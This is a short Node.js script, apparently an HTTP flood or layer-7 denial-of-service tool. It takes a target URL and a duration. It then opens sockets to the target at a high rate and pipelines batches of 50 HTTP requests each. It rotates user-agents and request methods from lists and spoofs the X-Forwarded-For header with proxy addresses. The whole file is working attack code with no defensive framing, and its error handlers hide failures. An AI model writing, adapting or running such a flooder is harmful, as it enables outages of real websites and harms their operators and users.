const fs = require('fs');
const url = require('url');
const net = require('net');
if (process.argv.length <= 2) {
	console.log("Usage: node data.js <url> <time> <port>");
	console.log("Usage: node data.js <http://example.com> <60> <80>");
	process.exit(-1);
}
var target = process.argv[2];
var parsed = url.parse(target);
var host = url.parse(target).host;
var time = process.argv[3];
const proxies = fs.readFileSync('socks.txt', 'utf-8').match(/\S+/g);
const usgt = fs.readFileSync('us.txt', 'utf-8').match(/\S+/g);
const aksk = fs.readFileSync('ajak.txt', 'utf-8').match(/\S+/g);

process.on('uncaughtException', function (e) {
    console.warn("Send Request "+ proxies[Math.floor(Math.random() * proxies.length)]);
});

process.on('unhandledRejection', function (e) {
    console.warn("ERROR Request "+ proxies[Math.floor(Math.random() * proxies.length)]);
});

var int = setInterval(() => {
    var proxy = proxies[Math.floor(Math.random() * proxies.length)];
    var s = require('net').Socket();
    s.connect(80, host);
    s.setTimeout(10000);
    for (var i = 0; i < 50; i++) {
        s.write(''+ aksk[Math.floor(Math.random() * aksk.length)] +' ' + target + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + usgt[Math.floor(Math.random() * usgt.length)] + '\r\nX-Forwarded-For: '+ proxy.split(':')[0] +'\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
    }
    s.on('data', function () {
        setTimeout(function () {
            s.destroy();
            return delete s;
        }, 5000);
    })
});
setTimeout(() => clearInterval(int), time * 1000);